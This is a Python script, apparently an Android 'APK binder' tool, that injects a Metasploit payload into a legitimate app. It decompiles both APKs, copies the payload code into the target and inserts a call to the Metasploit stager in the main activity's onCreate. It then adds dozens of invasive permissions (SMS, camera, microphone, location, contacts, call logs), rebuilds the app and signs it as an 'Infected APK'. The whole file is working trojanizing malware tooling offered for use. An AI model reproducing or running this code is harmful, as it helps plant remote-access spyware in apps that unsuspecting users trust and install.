import re,os,sys,subprocess,glob,threading
from xml.dom.minidom import parseString
from time import sleep


YELLOW = '\033[33m'
BLUE = '\033[34m'
CYAN = '\033[36m'
GREEN = '\033[32;1m'
RED = '\033[31;1m'
WHITE = '\033[m'


cp = ''
mv = ''
rm = ''

if os.name == 'nt':
	cp = 'xcopy /q /y'
	mv = 'move '
	rm = 'rmdir /S /Q'
else:
	cp = 'cp -r'
	mv = 'mv'
	rm = 'rm -rf'

global package, package_name, package_name_path, smali_loc, smali_path,P1


def Update():
	if os.name == 'nt':
		pass # Will add for windows soon.
	else:
		print(YELLOW + 'Checking for updates...' + WHITE)
		o = open('.ver','r')
		oo = o.read()
		o.close()
		os.system(rm + ' .ver')
		os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/.ver')
		u = open('.ver','r').read()
		if int(oo) == int(u):
			print(YELLOW + 'No updates available' + WHITE)
		else:
			print(GREEN + "Update available. Updating...(DONT CLOSE!" + WHITE)
			os.system(rm + ' termux-install.sh main.py README.md CONTRIBUTORS.mf')
			os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/main.py')
			os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/README.md')
			os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/CONTRIBUTORS.md')
			os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/termux-install.sh')
			os.system('chmod +x *')
			print(GREEN + "Update Finished" + WHITE)
			exit()
def Usage():
	print(YELLOW + 'python3 %s <payload.apk> <target.apk> <output.apk> \n' % (str(sys.argv[0])))
	print('\n' + YELLOW + 'pass the ' + BLUE + "--update" + YELLOW + " parameter to update.\n" + WHITE)
	exit()

# Getting payload apk name

def PN():
	if '/' in str(sys.argv[1]):
		tmp = str(sys.argv[1]).split('/')
		name = tmp[len(tmp) - 1]
		return str(name)
	else:
		return str(sys.argv[1])

# Getting original apk name

def ON():
	if '/' in str(sys.argv[2]):
		tmp = str(sys.argv[2]).split('/')
		name = tmp[len(tmp) - 1]
		return name
	else:
		return str(sys.argv[2])


	return Android

# Finding main activity smali

def findA(xml):
	Android = ''
	with open(xml,'r') as f:
		dom = parseString(f.read())
		activities = dom.getElementsByTagName('activity')
		for activity in activities:
			intents = activity.getElementsByTagName('intent-filter')
			for intent in intents:
				actions = intent.getElementsByTagName('action')
				for action in actions:
					if action.getAttribute('android:name') == 'android.intent.action.MAIN':
						Android += activity.getAttribute('android:name') + '\n'
						break
	return Android.split('\n')[0]

# If couldnt find path of activity, then joining the package name and activity name to get the activity path

def SetA(A):
	if len(A.split('.')) == 1:
		A = P1+'.'+A		# P1 variable stores the package name
	elif len(A.split('.')) == 2:
		A= P1+A
	return A

# Finding package name
def findP(xml):
	fi = open(xml,'r')
	f=fi.readline()+fi.readline()
	pos1=f.find("package=")+9
	pos2=f.find('"',pos1+1)
	if pos1==8:
		return ''
	else:
		return f[pos1:pos2]

# Self Explanatory:

def SetP(P):
	global package,P1
	if '"' in P:
		P = P.replace('"','')
	if '>' in P:
		P = P.replace('>','')
	if '<' in P:
		P = P.replace('<','')
	P1 = P
	package = P.replace('.', '/')
	return package, P


# Finding hook point in the main activity smali
def find(smali,par):
	count = 0
	SmaliCon = ''
	TargetStr = ''

	with open(smali,'r') as f:
		SmaliCon = f.read()
		for i in SmaliCon.split('\n'):
			if 'invoke-super' in i and 'onCreate(Landroid/os/Bundle;)V' in i:
					TargetStr = i
					break
			else:
				count += 1
	if TargetStr != '':
		print ("Hook point can be injected after line %d" % (count + 1))
		return SmaliCon, TargetStr, count

# Injecting hook in smali

def newsmali(contents,targetstring):
	with open('newsmali','w') as f:
		for i in contents.split('\n'):
			if i == targetstring:
				f.write('\n')
				f.write(i)
				f.write('\n')
				f.write('    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V')
			else:
				f.write('\n')
				f.write(i)


# The main event

def Bind():
	try:
		global out
		Perms_List = ['<uses-permission android:name="android.permission.INTERNET"/>','<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>','<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>','<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>','<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>','<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>','<uses-permission android:name="android.permission.READ_PHONE_STATE"/>','<uses-permission android:name="android.permission.SEND_SMS"/>','<uses-permission android:name="android.permission.RECEIVE_SMS"/>','<uses-permission android:name="android.permission.RECORD_AUDIO"/>','<uses-permission android:name="android.permission.CALL_PHONE"/>','<uses-permission android:name="android.permission.READ_CONTACTS"/>','<uses-permission android:name="android.permission.WRITE_CONTACTS"/>','<uses-permission android:name="android.permission.RECORD_AUDIO"/>','<uses-permission android:name="android.permission.WRITE_SETTINGS"/>','<uses-permission android:name="android.permission.CAMERA"/>','<uses-permission android:name="android.permission.READ_SMS"/>','<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>','<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>','<uses-permission android:name="android.permission.SET_WALLPAPER"/>','<uses-permission android:name="android.permission.READ_CALL_LOG"/>','<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>','<uses-permission android:name="android.permission.WAKE_LOCK"/>']

		Feature_List = ['<uses-feature android:name="android.hardware.camera"/>','<uses-feature android:name="android.hardware.camera.autofocus"/>','<uses-feature android:name="android.hardware.microphone"/>']


		payload = PN()
		original = ON()

	# STEP 1.
		
		try:
			#Dont Change os.popen To subprocess It Would Fill YOur Screen
			if os.path.isdir("TempP"):
				print(CYAN + "[+] Cleaning Temporary Files..." + WHITE)
				subprocess.call(rm + " TempP",shell=True)
				if not os.path.isdir("TempP"):
					os.mkdir("TempP")
				print (CYAN + "done." + WHITE)
			else:
				os.mkdir("TempP")
		except:
			pass
		print(CYAN + "[+] Copying APKs..." + WHITE)
		subprocess.call(cp + ' ' +  str(sys.argv[1]) + " TempP", shell=True)
		subprocess.call(cp + ' ' + str(sys.argv[2]) + " TempP", shell=True)

		print (CYAN + "done." + WHITE)

	# STEP 2.

		print (CYAN + "[+] Decompiling APKs...\n" + WHITE)
		os.chdir("TempP/")
		os.system('apktool d -f %s' % (original))
		os.system('apktool d -f %s' % (payload))

		print (CYAN + "\ndone." + WHITE)
	# STEP 3.

		print (CYAN + '[+] Copying payload smali codes to target apk...' + WHITE)
		if cp.lower().startswith("xcopy"):
			subprocess.call(cp + ' /e "%s/smali/"  "%s/smali/"' % (payload.replace('.apk',''), original.replace('.apk','')), shell=True)
		else:
			subprocess.call(cp + ' "%s/smali/com/"  "%s/smali/"' % (payload.replace('.apk',''), original.replace('.apk','')), shell=True)
		print (CYAN + "done." + WHITE)

	# STEP 4.

		print (CYAN + "[+] Fetching Package Name & MainActivity smali location" + WHITE)
		package_name_path, package_name = SetP(findP('%s/AndroidManifest.xml' % (original.replace('.apk',''))))
		smalitarget = SetA(findA("%s/AndroidManifest.xml" % (original.replace('.apk',''))))
		smali_name = smalitarget.split('.')[len(smalitarget.split('.')) - 1]
		smali_loc = smalitarget.replace('.','/')
		if not os.path.isfile("%s/smali/%s.smali" % (original.replace('.apk',''),smali_loc)):
			print (YELLOW + "\n\nIt looks like this app is somewhat protected. \nThe MainActivity smali file which is specified in the AndroidManifest.xml (%s) is not present.\n CANNOT CONTINUE. EXITING..." % (smali_loc) + WHITE )
			subprocess.call(rm + 'TempP')
			exit()
		else:
			smali_name = smali_loc.split('/')[len(smali_loc.split('/')) - 1]
			print (CYAN + "\nMainActivity Smali location:- " + GREEN + '%s' %(str(smali_loc)))
			print (CYAN + 'Package Name:- ' + GREEN + '%s' % (str(package_name)))
			print ("\n")

	# STEP 5.
		print (CYAN + "[+] Injecting Hook")
		con,trgstr,lineno = find(original.replace('.apk','')+'/smali/'+smali_loc+'.smali','null' )
		newsmali(con,trgstr)
		subprocess.call(mv + ' newsmali %s/smali/%s.smali' % (original.replace('.apk',''), smali_loc),shell=True)

	# STEP 6.

		print (CYAN + "[+] Writing Permissions,Features,etc." + WHITE)
		tar_man='%s/AndroidManifest.xml' % (original.replace('.apk',''))
		with open(tar_man,'r') as f:
			con = f.read()
			spcP = 0
			spcF = 0
			delF = []
			delP = []
			fbool = False
			pbool = False
			for i in con.split('\n'):
				if Perms_List.count(i.strip()) >0:
					Perms_List.remove(i.strip())
					spcP = i.find('<')
				elif Feature_List.count(i.strip()) >0:
					Feature_List.remove(i.strip())
					spcF = i.find('<')
			f1 = open(tar_man,'w')
			for i in con.split('\n'):
				if "<uses-permission " in i and not pbool:
					for k in Perms_List:
						f1.write('\n')
						print (YELLOW + "\n 	Injecting Permission:- " + WHITE + k)
						f1.write((' ' * spcP) + k)
					pbool = True
				elif "<uses-feature " in i and not fbool:
					for k in Feature_List:
						f1.write('\n')
						print (YELLOW + "\n 	Injecting Feature:- " + WHITE + k)
						f1.write((' ' * spcF) + k)
					fbool = True
				else:
					f1.write(i)
					f1.write('\n')
			f1.close()
		
		print (CYAN + 'done.' + WHITE)

	# STEP 6.

		print (CYAN + '[+] Compiling Infected APK...\n' + WHITE)

		subprocess.call("apktool b %s -o %s -f" % (original.replace('.apk',''),str(sys.argv[3])),shell=True)
		subprocess.call(mv + ' '+ str(sys.argv[3]) + ' ..',shell=True)
		os.chdir('../')
		print(CYAN + '[+] Signing Infected APK...\n' + WHITE)
		subprocess.call("apksigner sign --ks keystore/release.keystore --ks-pass pass:lmaolmfao %s" % (str(sys.argv[3])),shell=True)
		print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(sys.argv[3]),str(os.path.getsize(str(sys.argv[3])))) + WHITE)	
		subprocess.call(rm + " TempP",shell=True)
		exit()
	except (UnicodeDecodeError) as e:
		subprocess.call(rm + ' TempP',shell=True)
		print(RED + "Looks like APKTool has failed to decompile properly. Exiting..." + WHITE)
		exit()
	except Exception as e:
		subprocess.call(rm + ' TempP',shell=True)
		print(RED + "ERROR OCCURED! EXITING..." + WHITE)
		print('\n' + str(e))
		exit()

# Checking whether APKTOOL & APKSIGNER are installed or not.

def main():
	which = ''
	if os.name == 'nt':
		which = 'where'
	else:
		which = 'which'
	print("Checking whether APKTOOL is installed or not...")
	os.system(which + " apktool>>ap.txt")
	if os.path.getsize('ap.txt') == 0:
		print(RED + "\nERROR: " + WHITE + "APKTOOL is not installed or not in path. Exiting.")
		os.system(rm + " ap.txt")
		exit()
	else:
		print(GREEN + "INSTALLED" + WHITE)
		os.system(rm + " ap.txt")
	print("Checking whether APKSIGNER is installed or not...")
	os.system(which + " apksigner>>aps.txt")
	if os.path.getsize('aps.txt') == 0:
		print(RED + "\nERROR: " + WHITE + "APKSIGNER is not installed or not in path. Exiting")
		os.system(rm + " aps.txt")
		exit()
	else:
		print(GREEN + "INSTALLED" + WHITE)
		os.system(rm + " aps.txt")
	print(YELLOW + "\nALL OK, Checking args...\n\n" + WHITE)
	argscheck()


# This is self explanatory.

def argscheck():

	if len(sys.argv) == 4:
		if os.path.isfile(str(sys.argv[1])) and os.path.isfile(str(sys.argv[2])):
			Bind()
		else:
			print (RED + '\nAPK(s) specified are not found!' + WHITE)
			exit()
	elif len(sys.argv) == 2:
		if str(sys.argv[1]) == '--update':
			Update()
		else:
			Usage()
	else:
		print (RED + "Not enough arguments passed. See help:-\n" + WHITE)
		Usage()


# Lol
print ('\nAuthor:' + RED + "R37r0 Gh057\n" + WHITE)
print ('Github: ' + GREEN + "https://github.com/R37r0-Gh057\n" + WHITE)
print ('Telegram:' + BLUE + "@R37R0_GH057\n" + WHITE)
print("\nSPECIAL THANKS TO:- " + RED + 'TheSpeedX ' + BLUE + "{" + GREEN + 'https://github.com/TheSpeedX' + BLUE + "}" + WHITE + " For Optimising the script. :D\n\n")
print("====================================================\n\n")
sleep(1)

# Finally:-
if os.path.exists("/data/data/com.termux/files/home"):
	print(RED + "WARNING: " + BLUE + "APKTool may not run properly on Termux\n\n" + WHITE)

main()
